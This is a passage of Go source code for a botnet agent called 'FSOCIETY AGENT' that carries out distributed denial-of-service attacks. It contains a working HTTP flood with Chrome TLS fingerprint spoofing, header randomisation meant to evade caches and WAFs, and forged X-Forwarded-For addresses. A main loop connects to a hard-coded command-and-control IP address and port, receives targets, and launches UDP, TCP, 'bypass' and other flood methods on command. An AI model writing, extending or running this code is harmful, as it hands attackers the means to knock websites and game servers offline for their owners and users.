		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
}

// AHttpFlood implements high-performance HTTP/HTTPS flooding for agent
func AHttpFlood(targetURL string, seconds int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] L7 HTTP Flood started: %s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), targetURL, seconds, sessionID)

	var reqCounter int64 = 0

	// U-TLS Dialer to perfectly mimic Google Chrome
	utlsDialer := func(ctx context.Context, network, addr string) (net.Conn, error) {
		dialer := net.Dialer{Timeout: 5 * time.Second}
		rawConn, err := dialer.DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}

		host, _, _ := net.SplitHostPort(addr)
		
		config := &utls.Config{ServerName: host, InsecureSkipVerify: true}
		uconn := utls.UClient(rawConn, config, utls.HelloChrome_102)
		
		err = uconn.Handshake()
		if err != nil {
			rawConn.Close()
			return nil, err
		}
		
		return uconn, nil
	}

	transport := &http.Transport{
		MaxIdleConns:        1024,
		MaxIdleConnsPerHost: 1024,
		DialTLSContext:      utlsDialer,
		DisableCompression:  true,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	// Ultimate HTTP Flood
	workers := 1024
	if runtime.NumCPU() > 16 {
		workers = runtime.NumCPU() * 64
	}

	// Pre-generate request pool
	const poolSize = 1024
	referers := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://www.facebook.com/",
		"https://www.twitter.com/",
		"https://www.reddit.com/",
		targetURL,
	}

	reqPool := make([]*http.Request, poolSize)
	for i := 0; i < poolSize; i++ {
		req, _ := http.NewRequest("GET", targetURL, nil)
		req.Header.Set("User-Agent", AUserAgents[rand.Intn(len(AUserAgents))])
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Connection", "keep-alive")

		// Vary headers to bypass cache and WAF signatures
		if rand.Float32() > 0.5 {
			req.Header.Set("Cache-Control", "no-cache")
		} else {
			req.Header.Set("Cache-Control", "max-age=0")
		}

		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

		reqPool[i] = req
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			rIdx := uint32(rand.Intn(poolSize))
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}

				resp, err := client.Do(reqPool[rIdx%poolSize])
				if err == nil {
					resp.Body.Close()
					atomic.AddInt64(&reqCounter, 1)
				}
				rIdx++
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				rps := atomic.SwapInt64(&reqCounter, 0)
				fmt.Printf("[%s] HTTP STATS: %d Requests/s\n",
					time.Now().Format("15:04:05"), rps)
			}
		}
	}()

	time.AfterFunc(time.Duration(seconds)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
	fmt.Printf("[%s] HTTP Flood finished.\n", time.Now().Format("15:04:05"))
}

func main() {
	fmt.Print("\033[2J\033[H")
	fmt.Println(asciiArt)
	fmt.Println(AColorCyan + "        +-----------------------------------+" + AColorReset)
	fmt.Println(AColorCyan + "        |  " + AColorBold + "    FSOCIETY AGENT [ALPHA]    " + AColorReset + AColorCyan + "   |" + AColorReset)
	fmt.Println(AColorCyan + "        |  " + AColorDim + "      Awaiting commands...     " + AColorReset + AColorCyan + "  |" + AColorReset)
	fmt.Println(AColorCyan + "        +-----------------------------------+" + AColorReset)
	fmt.Println()

	// IMPORTANT: Set your raw GitHub URL here
	githubUpdateURL := ""

	if githubUpdateURL != "" {
		CheckForUpdates(githubUpdateURL)
	}

	controllerAddr := "5.175.192.188:9999"
	if len(os.Args) >= 2 {
		controllerAddr = os.Args[1]
	}

	for {
		fmt.Printf("%s[*] Connecting to %s...%s\n", AColorCyan, controllerAddr, AColorReset)
		conn, err := net.Dial("tcp", controllerAddr)
		if err != nil {
			fmt.Printf("%s[!] Connection failed. Retrying in 5s...%s\n", AColorRed, AColorReset)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Printf("%s[+] Connected! Listening for tasks...%s\n", AColorGreen, AColorReset)
		decoder := json.NewDecoder(conn)

		for {
			var cmd AttackCommand
			if err := decoder.Decode(&cmd); err != nil {
				fmt.Printf("%s[!] Connection lost: %v%s\n", AColorRed, err, AColorReset)
				conn.Close()
				break
			}

			fmt.Printf("%s[~] Target: %s:%d | Secs: %d | Method: %s%s\n",
				AColorCyan, cmd.TargetIP, cmd.TargetPort, cmd.Duration, cmd.Method, AColorReset)

			// Increment session ID to signal previous attacks to stop
			sessionID := atomic.AddInt32(&globalSessionID, 1)

			switch cmd.Method {
			case "UDP":
				go AUdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 65000, sessionID)
			case "TCP":
				go ATcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "HEX-BYPASS":
				go AHexBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "FIVEM":
				go AFivemFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "UDP-BYPASS":
				go AUdpBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "PPS-BYPASS":
				go APpsBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "GBP-BYPASS":
				go AGbpBypass(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "MTU-FLOOD":
				go AMtuFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "RAW-HTTP":
				go ATcpHttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, sessionID)
			case "HTTP":
				go AHttpFlood(cmd.TargetIP, cmd.Duration, sessionID)
			case "UPDATE":
				// Support updates via command too
				fmt.Printf("%s[*] Remote update command received.%s\n", AColorYellow, AColorReset)
				// Here we could pass a URL from the command if needed
			default:
				fmt.Printf("%s[!] Method '%s' not supported.%s\n", AColorRed, cmd.Method, AColorReset)
			}
		}
	}
}
